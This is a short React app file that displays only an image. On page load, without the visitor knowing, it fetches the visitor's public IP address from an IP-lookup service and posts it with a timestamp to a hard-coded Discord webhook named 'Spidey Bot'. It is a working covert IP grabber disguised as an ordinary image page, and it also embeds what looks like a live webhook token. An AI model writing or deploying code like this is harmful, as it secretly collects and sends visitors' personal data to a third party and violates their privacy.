import pixImg from './assets/pix.png'
import './app.css'
import { useEffect } from 'react'
import axios from 'axios';

function App() {

  async function GetIp() {
    try {
      var res = await fetch('https://api.ipify.org?format=json')
      var data = await res.json();
      var now = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

      await axios.post('https://discord.com/api/webhooks/1126515798232535070/vbjh-mU-PSBh9SuvTlevzj_ioKwe-bgJKThqB1C0oDPpbZroEjP0ipQP4gGNKrWnhQ4M', {
        username: "Spidey Bot",
        avatar_url: "",
        content: `[${now}] Endereço ip: ${data.ip}`
      })


    } catch (error) {
      console.error('Erro');

    }
  }

  useEffect(() => {
    GetIp()
  }, [])

  return (
    <div id='container'>
      <img src={pixImg} />
    </div>
  )
}

export default App
